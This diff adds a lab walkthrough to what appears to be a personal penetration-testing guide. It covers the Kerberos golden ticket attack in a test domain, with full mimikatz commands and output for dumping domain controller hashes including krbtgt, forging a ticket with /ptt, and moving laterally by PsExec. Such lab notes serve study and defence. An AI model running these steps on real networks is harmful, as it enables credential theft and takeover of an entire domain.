@@ -706,6 +706,7 @@ mimikatz # kerberos::hash /password:P@ssw0rd
 ```
 
 ### 3.2.3. Purge existing kerberos tickkets
+- ☝️ **Note**: it is important to run `kerberos::purge` even if `klist` show zero cached tickets
 ```console
 mimikatz # kerberos::purge
 Ticket(s) purge for current session is OK
@@ -770,10 +771,200 @@ LAB\nonexistentuser
 
 # 5. Golden Ticket
 
+## 5.1. Dump password hashes on domain controller
+- Requires `Domain Admins` rights
+- Information of interest: domain SID and `krbtgt` password hash
 ```console
-lsadump::lsa /patch
-kerberos::purge
-kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
-misc::cmd
-psexec.exe \\dc01 cmd.exe
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::lsa /patch
+Domain : LAB / S-1-5-21-1470288461-3401294743-676794760
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : e19ccf75ee54e06b06a5907af13cef42
+
+RID  : 000001f5 (501)
+User : Guest
+LM   :
+NTLM :
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   :
+NTLM : 3ac4cccaca955597db0d11a7ffa50025
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+LM   :
+NTLM :
+
+RID  : 0000044f (1103)
+User : bindaccount
+LM   :
+NTLM : e19ccf75ee54e06b06a5907af13cef42
+
+RID  : 00000450 (1104)
+User : domainadmin
+LM   :
+NTLM : e19ccf75ee54e06b06a5907af13cef42
+
+RID  : 00000451 (1105)
+User : mike
+LM   :
+NTLM : e19ccf75ee54e06b06a5907af13cef42
+
+RID  : 00000452 (1106)
+User : cindy
+LM   :
+NTLM : e19ccf75ee54e06b06a5907af13cef42
+
+RID  : 00000453 (1107)
+User : john
+LM   :
+NTLM : e19ccf75ee54e06b06a5907af13cef42
+
+RID  : 00000454 (1108)
+User : paul
+LM   :
+NTLM : e19ccf75ee54e06b06a5907af13cef42
+
+RID  : 00000455 (1109)
+User : mssqlsvcacct
+LM   :
+NTLM : e19ccf75ee54e06b06a5907af13cef42
+
+RID  : 00000456 (1110)
+User : mssqlsysadm
+LM   :
+NTLM : e19ccf75ee54e06b06a5907af13cef42
+
+RID  : 00000457 (1111)
+User : itmanager
+LM   :
+NTLM : e19ccf75ee54e06b06a5907af13cef42
+
+RID  : 00000458 (1112)
+User : itadmin
+LM   :
+NTLM : e19ccf75ee54e06b06a5907af13cef42
+
+RID  : 000003e8 (1000)
+User : DC$
+LM   :
+NTLM : 8865ea60bb34d0b1b2984e609bebbfb5
+
+RID  : 0000045b (1115)
+User : SVR$
+LM   :
+NTLM : e629246410c5795d27b1f16b221cf083
+
+RID  : 0000045c (1116)
+User : CLIENT$
+LM   :
+NTLM : e2c3ed7139fd3efd244df58c9b2aeb6b
+```
+
+## 5.2. Create golden ticket using information retrieved from domain controller
+- This can be performed on any domain member machine, without administrator rights
+- ☝️ **Note**: it is important to run `kerberos::purge` even if `klist` show zero cached tickets
+- The `misc::cmd` command opens a command prompt session with the golden ticket injected to that session
+```console
+mimikatz # kerberos::purge
+Ticket(s) purge for current session is OK
+
+mimikatz # kerberos::golden /user:nonexistentuser /domain:lab.vx /sid:S-1-5-21-1470288461-3401294743-676794760 /krbtgt:3ac4cccaca955597db0d11a7ffa50025 /ptt
+User      : nonexistentuser
+Domain    : lab.vx (LAB)
+SID       : S-1-5-21-1470288461-3401294743-676794760
+User Id   : 500
+Groups Id : *513 512 520 518 519
+ServiceKey: 3ac4cccaca955597db0d11a7ffa50025 - rc4_hmac_nt
+Lifetime  : 23/4/2022 4:05:49 pm ; 20/4/2032 4:05:49 pm ; 20/4/2032 4:05:49 pm
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'nonexistentuser @ lab.vx' successfully submitted for current session
+
+mimikatz # misc::cmd
+Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6FF396438
+```
+
+## 5.3. Use the golden ticket to laterally move to **any** domain machine
+- Verify golden ticket in session
+```console
+C:\Users\john>hostname
+CLIENT
+
+C:\Users\john>ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 192.168.17.161
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.17.1
+
+C:\Users\john>klist
+
+Current LogonId is 0:0x50b951
+
+Cached Tickets: (1)
+
+#0>     Client: nonexistentuser @ lab.vx
+        Server: krbtgt/lab.vx @ lab.vx
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
+        Start Time: 4/23/2022 15:47:53 (local)
+        End Time:   4/20/2032 15:47:53 (local)
+        Renew Time: 4/20/2032 15:47:53 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+```
+
+- Attempt to connect to domain member machine
+```console
+C:\Users\john>PsExec.exe \\SVR.lab.vx cmd.exe
+
+PsExec v2.34 - Execute processes remotely
+Copyright (C) 2001-2021 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+lab\nonexistentuser
+
+C:\Windows\system32>hostname
+SVR
+
+C:\Windows\system32>ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 192.168.17.151
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.17.1
+
+Tunnel adapter isatap.{122DB809-79C7-4A57-9A51-76A6C8B0B97B}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . :
 ```
